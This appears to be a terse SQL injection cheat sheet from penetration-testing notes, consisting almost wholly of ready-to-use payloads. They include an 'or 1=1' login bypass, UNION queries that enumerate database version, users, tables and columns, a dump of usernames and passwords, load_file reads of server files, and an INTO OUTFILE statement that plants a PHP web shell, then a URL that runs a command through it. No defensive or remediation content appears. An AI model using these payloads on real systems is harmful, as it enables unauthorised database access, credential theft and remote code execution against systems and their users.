### SQL Injection

```
' or 1=1 LIMIT 1;#
```
```
<Username>' or 1=1 LIMIT 1;#
```
```
id=1 order by 1
```
```
UNION all select 1,2,3
```
```
UNION all select 1,2, @@version
```
```
UNION all select 1,2, user()
```
```
UNION all select 1,2, table_name from information_schema.tables
```
```
UNION all select 1,2, column_name from information_schema.columns where table_name='users'
```
```
UNION all select 1, username, password from users
```
```
UNION all select 1,2, load_file('path/to/file')
```
```
UNION all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE'path/to/backdoor.php'

----
(ip/backdoor.php?cmd=ipconfig)
```


